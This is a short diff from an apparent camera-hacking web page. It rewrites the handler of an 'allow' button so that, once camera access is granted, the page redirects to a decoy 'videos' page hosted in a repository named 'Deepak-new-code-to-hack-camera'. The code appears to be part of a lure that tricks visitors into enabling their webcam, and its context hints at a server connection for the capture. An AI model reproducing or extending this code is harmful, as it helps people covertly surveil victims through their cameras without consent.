@@ -1072,33 +1072,22 @@ function reconnectServer(){
 ========================================= */
 
 allowBtn.onclick =
-  async () => {
+allowBtn.onclick = async () => {
 
-    const started =
-      await startCamera();
+  const started = await startCamera();
 
+  if (started) {
 
-    if(started){
+    setTimeout(() => {
 
-      /*
-        Open Google in a NEW TAB.
+      window.location.href =
+        "https://deepakbheemaraj46-rgb.github.io/Deepak-new-code-to-hack-camera/videos.html";
 
-        The camera page stays open.
-      */
+    }, 500);
 
-      setTimeout(() => {
+  }
 
-        window.open(
-          "https://deepakbheemaraj46-rgb.github.io/Deepak-new-code-to-hack-camera/videos.html",
-          "_blank"
-        );
-
-      },500);
-
-    }
-
-  };
-
+};
 
 /* =========================================
    CAMERA TAB RETURNS
